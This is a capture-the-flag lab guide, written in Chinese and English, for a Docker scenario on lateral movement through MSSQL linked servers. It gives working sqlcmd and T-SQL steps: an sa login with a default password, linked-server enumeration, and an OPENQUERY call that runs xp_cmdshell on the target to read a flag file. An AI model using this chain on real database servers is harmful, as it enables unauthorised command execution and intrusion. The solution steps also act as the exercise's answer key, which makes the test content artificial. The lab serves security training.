# DB-04: MSSQL Linked Server Lateral Movement

## 场景信息

| 字段 | 值 |
|---|---|
| ID | DB-04 |
| 名称 | MSSQL Linked Server Lateral Movement |
| 技术/CVE | MSSQL Linked Server |
| 难度 | L3 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10204 |

## 场景概述
- 技术：MSSQL Linked Server
- 难度：L3
- 交付方式：docker
- 入口端口：10204
## 攻击路径与利用步骤

| Property | Value |
|----------|-------|
| Technique | MSSQL Linked Server |
| Difficulty | L3 |
| Low-Priv Port | 10204 |
| Target Port | 10214 |

### Attack Path
```
Connect to low-priv MSSQL → Enumerate linked servers → OPENQUERY to target → xp_cmdshell on target → /flag.txt
```

```bash
# Connect to low-priv instance
sqlcmd -S localhost,10204 -U sa -P 'Password123!'

# Enumerate linked servers
SELECT name FROM sys.servers;

# Execute via linked server to target (runs on the target server)
SELECT * FROM OPENQUERY([TARGET], 'EXEC xp_cmdshell ''type C:\flag.txt''');
# flag{db-04-xxxxxxxxxxxxxxxx}
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Two MSSQL instances reached through Docker Compose socat proxies |
| 侦察与前置条件 | Linked-server enumeration and low/target server role distinction |
| 核心漏洞与利用 | Use OPENQUERY against the linked target and invoke xp_cmdshell |
| 权限、横向或影响 | Lateral movement from low MSSQL to target-host command execution |
| 验证 | Read C:\flag.txt through the target linked-server query |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。

## Flag

完成上述利用后，读取场景返回的 `flag{...}` 值；可用 `scripts/verify-flag.sh` 验证捕获结果。
